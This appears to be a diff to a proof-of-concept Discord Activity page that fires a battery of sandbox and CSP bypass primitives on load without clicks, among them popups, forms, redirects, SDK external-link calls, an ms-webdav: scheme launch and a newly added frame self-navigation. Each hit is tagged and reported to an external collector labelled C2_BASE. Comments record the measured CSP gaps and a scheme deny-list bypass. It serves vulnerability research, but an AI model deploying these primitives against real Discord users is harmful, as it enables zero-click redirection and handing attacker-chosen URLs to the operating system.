@@ -15,10 +15,23 @@
   Then launch via https://discord.com/activities/1562221016007184404
   or the Activities shelf in a voice channel.
 
-  WHAT IT PROVES: every primitive below fires on load with zero gestures.
-  Each carries a nonce-TAG so hits.tsv shows EXACTLY which primitive reached
-  the collector. Tags: wopen, anchor, formget, formpost, iframe, redir,
-  redirExt, scheme, sdkDirect, sdkProx, sdkBounce, bounce2nd.
+  MEASURED FACTS (0.0.418 client + live proxy CSP), see STEPS.md:
+  - Activity iframe sandbox has allow-popups ONLY when the app is first-party
+    or its server-side config has displays_advertisements=true. The dev portal
+    cannot set that, so window.open returns null (P1).
+  - The proxy CSP allows frame-src/connect-src only to the app proxy, so
+    P4/P5/P7 (child frames / beacons to an external host) are blocked inside
+    Discord even though they work on a plain page.
+  - CSP cannot restrict navigation of the frame itself (no navigate-to in
+    Chromium), so P11 (self-nav) works with zero clicks and no mapping.
+  - sdk openExternalLink shows a dialog UNLESS Discord's backend says the URL
+    is trusted: GET /applications/<id>/trusted-links/check?url=… ⇒ {trusted}.
+    The main-process gate is only a 14-scheme deny-list, so ms-webdav: passes
+    once any renderer path reaches saferShellOpenExternal.
+
+  Each primitive carries a nonce-TAG so hits.tsv shows which one landed.
+  Tags: wopen, anchor, formget, formpost, iframe, redir, r302d, scheme,
+  sdkDirect, sdkProx, sdkBounce, bounce2nd, selfnav.
 -->
 <style>
  html,body{margin:0;height:100%}
@@ -53,6 +66,8 @@ catch { try { ({DiscordSDK} = await import('https://cdn.jsdelivr.net/npm/@discor
 // ================= CONFIG =================
 const APP_CLIENT_ID = '1562221016007184404';
 const C2_BASE = 'https://trans-perfectly-pushing-headers.trycloudflare.com';
+// P11 target: the Activity frame navigates itself here. Keep it https and
+// reachable; no URL mapping is required (CSP does not cover frame self-nav).
 const CARRIER_HOST = '127.0.0.1:8080';
 const CARRIER = 'ms-webdav';
 // ==========================================
@@ -200,6 +215,18 @@ async function pSdk(){
 // panel survives long enough to be read (bounce/iframe can navigate away).
 const SKIP = new Set((qs.get('skip') || '').split(',').filter(Boolean));
 
+// P11: self-navigation. The proxy CSP (measured live on
+// <appid>.discordsays.com) restricts frame-src/connect-src to the app proxy,
+// but CSP does not govern navigation of the frame itself and Chromium has no
+// navigate-to. So this replaces the Activity frame with an arbitrary page
+// with zero clicks, zero dialogs and no URL mapping.
+function pSelfNav(){
+  setTimeout(() => {
+    log('P11 self-nav -> canary (frame will be replaced)', 'dim');
+    try { location.replace(can('selfnav')); } catch(e){ log('P11 threw: ' + e, 'bad'); }
+  }, 2500);
+}
+
 async function fireAll(reason){
   log('--- fire (' + reason + ') ---', 'dim');
   if (!SKIP.has('wopen'))   pWindowOpen();
@@ -210,6 +237,7 @@ async function fireAll(reason){
   if (!SKIP.has('scheme'))  pScheme();
   if (!SKIP.has('bounce'))  pBounce();
   if (!SKIP.has('sdk'))     await pSdk();
+  if (!SKIP.has('selfnav') && qs.get('nav') !== '0') pSelfNav();
 }
 
 fireAll('on-load (zero clicks so far)');
